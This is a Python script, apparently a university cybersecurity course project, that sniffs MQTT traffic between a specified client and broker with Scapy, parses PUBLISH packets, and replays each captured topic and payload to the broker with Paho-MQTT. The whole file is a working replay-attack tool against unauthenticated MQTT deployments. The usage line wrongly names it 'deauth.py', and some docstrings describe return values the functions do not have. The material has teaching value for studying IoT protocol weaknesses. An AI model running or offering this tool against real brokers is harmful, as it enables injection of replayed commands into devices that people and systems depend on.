"""
Univerità degli studi di Bologna
Project for the Cybersecurity course
Academic year 2024/2025

Script for capturing and replaying MQTT PUBLISH messages on a network.
Uses Scapy to sniff MQTT traffic and Paho-MQTT to resend intercepted messages to the broker.

Usage: python deauth.py -i <interface> --source <source_ip> --broker <broker_ip> [--port <broker_port>]
- interface: Network interface to monitor
- source_ip: IP address of the MQTT client
- broker_ip: IP address of the MQTT broker
- broker_port: Port number of the MQTT broker (default: 1883)

Authors:
- Emanuele Grasso   (0001141478)
- Simone Rinaldi    (0001140193)
"""

#!/usr/bin/env python3

import argparse
import sys
from scapy.all import *
import paho.mqtt.client as mqtt

def get_args():
    """
    Parse command-line arguments.
    
    Returns:
        argparse.Namespace: Parsed command-line arguments containing network interface and host IPs.
    """
    parser = argparse.ArgumentParser(description='Monitor and Replay MQTT Traffic')
    parser.add_argument('-i', '--interface', required=True, help='Network interface to monitor')
    parser.add_argument('--source', required=True, help='Source IP address (e.g., client)')
    parser.add_argument('--broker', required=True, help='MQTT broker IP address')
    parser.add_argument('--port', type=int, default=1883, help='MQTT broker port (default: 1883)')
    return parser.parse_args()

def validate_ip(ip):
    """
    Validate IP address format.
    
    Args:
        ip (str): IP address to validate.

    Returns:
        bool: True if the IP address is valid, False otherwise.
    """
    try:
        parts = ip.split('.')
        return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
    except:
        return False

def decode_remaining_length(data):
    """
    Decode MQTT's variable-length remaining length.
    
    Args:
        data (bytes): Data containing the remaining length bytes.
    
    Returns:
        tuple: Decoded remaining length and number of bytes used.
    """
    multiplier = 1
    value = 0
    bytes_used = 0
    for byte in data:
        bytes_used += 1
        value += (byte & 127) * multiplier
        if (byte & 128) == 0:
            break
        multiplier *= 128
        if bytes_used > 4:
            break
    return value, bytes_used

def parse_mqtt_publish(raw_data):
    """
    Parse an MQTT PUBLISH packet from raw bytes.
    
    Args:
        raw_data (bytes): Raw data containing the MQTT packet.

    Returns:
        tuple: Parsed topic and payload, or None if the packet is not a PUBLISH message
    """
    if len(raw_data) < 2:
        return None, None
    
    fixed_header = raw_data[0]
    packet_type = fixed_header >> 4
    if packet_type != 3:
        return None, None
    
    _, rl_bytes = decode_remaining_length(raw_data[1:])
    header_end = 1 + rl_bytes
    
    if len(raw_data) < header_end + 2:
        return None, None
    
    topic_length = (raw_data[header_end] << 8) | raw_data[header_end + 1]
    topic_start = header_end + 2
    topic_end = topic_start + topic_length
    
    if len(raw_data) < topic_end:
        return None, None
    
    try:
        topic = raw_data[topic_start:topic_end].decode('utf-8', errors='replace')
    except:
        return None, None
    
    qos = (fixed_header & 0x06) >> 1
    payload_start = topic_end
    if qos > 0:
        payload_start += 2
    
    payload = raw_data[payload_start:]
    return topic, payload

def analyze_packet(packet, source_ip, broker_ip, mqtt_client):
    """
    Analyze MQTT packets between source and broker.
    
    Args:
        packet (scapy.packet.Packet): Captured network packet.
        source_ip (str): IP address of the MQTT client.
        broker_ip (str): IP address of the MQTT broker.

    Returns:
        tuple: Parsed topic and payload, or None if the packet is not a PUBLISH message
    """
    try:
        if IP in packet and TCP in packet:
            src_ip, dst_ip = packet[IP].src, packet[IP].dst
            if (src_ip, dst_ip) in [(source_ip, broker_ip), (broker_ip, source_ip)] and (packet[TCP].sport == args.port or packet[TCP].dport == args.port):
                if packet.haslayer(Raw):
                    raw_data = bytes(packet[Raw].load)
                    topic, payload = parse_mqtt_publish(raw_data)
                    print(f"MQTT PUBLISH from {src_ip} to {dst_ip} - Topic: {topic}")
                    if topic:
                        ret = mqtt_client.publish(topic, payload)
                        if ret.rc == mqtt.MQTT_ERR_SUCCESS:
                            print(f"[+] Published message on topic '{topic}'")
                        else:
                            print(f"[-] Failed to publish message on topic '{topic}'")
    except Exception as e:
        print(f"Error analyzing packet: {str(e)}")

def monitor_mqtt_traffic(interface, source_ip, broker_ip, mqtt_client):
    """
    Monitor MQTT traffic and replay PUBLISH messages.
    
    Args:
        interface (str): Network interface to monitor.
        source_ip (str): IP address of the MQTT client.
        broker_ip (str): IP address of the MQTT broker.
        mqtt_client (paho.mqtt.client.Client): MQTT client to replay messages

    Returns:
        tuple: Parsed topic and payload, or None if the packet is not a PUBLISH message
    """
    filter_expr = f"(host {source_ip} and host {broker_ip}) and (port {args.port})"
    print(f"Starting MQTT traffic analysis on {interface}")
    try:
        sniff(
            iface=interface,
            filter=filter_expr,
            prn=lambda x: analyze_packet(x, source_ip, broker_ip, mqtt_client),
            store=0
        )
    except KeyboardInterrupt:
        print("Monitoring stopped by user")
    except Exception as e:
        print(f"Error during monitoring: {str(e)}")

if __name__ == "__main__":
    args = get_args()
    if not validate_ip(args.source) or not validate_ip(args.broker):
        print("Error: Invalid IP addresses")
        sys.exit(1)
    
    print("MQTT Traffic Monitor\nPress Ctrl+C to stop monitoring")
    mqtt_client = mqtt.Client()
    try:
        mqtt_client.connect(args.broker, args.port, keepalive=60)
        mqtt_client.loop_start()
    except Exception as e:
        print(f"Error connecting to MQTT broker: {e}")
        sys.exit(1)
    
    monitor_mqtt_traffic(args.interface, args.source, args.broker, mqtt_client)
    
    mqtt_client.loop_stop()
    mqtt_client.disconnect()
    sys.exit(0)
